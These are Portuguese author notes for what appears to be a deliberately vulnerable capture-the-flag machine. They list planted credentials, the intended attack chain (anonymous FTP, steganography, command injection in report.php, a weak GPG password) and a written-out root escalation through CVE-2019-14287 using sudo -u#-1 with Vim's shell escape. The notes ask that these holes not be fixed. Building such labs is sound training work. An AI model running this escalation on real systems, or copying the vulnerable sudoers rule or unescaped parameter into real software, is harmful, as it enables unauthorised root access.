# Notas do autor

## Segredos intencionais

- Login web: `archives / M4ry_1s_W41t1ng`
- Passphrase do GPG: `promise`
- SSH: `james / L4k3v13w_312#Archive`
- Passphrase do steghide: `room312`

## Vulnerabilidades intencionais

1. FTP anônimo para obtenção do arquivo inicial.
2. Esteganografia protegida por passphrase temática.
3. Command injection autenticada em `website/report.php`.
4. Credenciais SSH em `/maintenance-access.gpg`, protegido por senha fraca.
5. Sudo 1.8.27 e regra Runas vulnerável à CVE-2019-14287.

## Escalada final

Versão instalada deliberadamente:

```text
Sudo version 1.8.27
```

Regra intencional:

```text
james ALL=(ALL,!root) NOPASSWD: /usr/bin/vim
```

Exploração:

```bash
sudo -u#-1 /usr/bin/vim
```

No Vim:

```vim
:set shell=/bin/bash
:shell
```

## O que não deve ser corrigido antes da avaliação

- Não atualize o Sudo para 1.8.28 ou superior.
- Não remova a exclusão `!root` da regra, pois ela faz parte do cenário da CVE.
- Não substitua o Sudo compilado pelo pacote corrigido da distribuição.
- Não remova a permissão de execução do Vim no sudoers.
- Não aplique `escapeshellarg()` ao parâmetro vulnerável do relatório.
- Não torne `/home/james/user.txt` legível pelo usuário `www-data`.
- Não publique a porta 3306 do MariaDB.
